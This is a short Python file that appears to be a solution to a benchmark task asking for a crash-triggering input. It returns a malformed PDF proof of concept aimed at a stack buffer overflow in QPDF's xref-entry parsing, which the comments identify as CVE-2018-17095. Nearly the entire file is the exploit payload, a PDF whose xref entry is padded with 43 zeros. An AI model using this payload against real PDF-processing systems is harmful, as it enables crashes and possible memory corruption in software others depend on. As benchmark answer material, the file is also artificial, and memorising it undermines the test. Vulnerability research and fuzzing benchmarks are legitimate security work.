import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC exploits CVE-2018-17095 in QPDF
        # The vulnerability is in QPDF::read_xrefEntry where overlong
        # f1 or f2 entries consisting only of zeros can cause a stack buffer overflow.
        # The ground-truth PoC length is 48 bytes.
        
        # Create a minimal PDF with a malformed xref entry
        # Format: "startxref\nxref\n0 1\n<malformed entry>"
        # The malformed entry uses 43 zeros for the first number to trigger overflow
        
        poc = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids []
/Count 0
>>
endobj
xref
0 2
0000000000000000000000000000000000000000000 65535 f 
0000000010 00000 n 
trailer
<<
/Size 2
/Root 1 0 R
>>
startxref
10
%%EOF"""
        
        return poc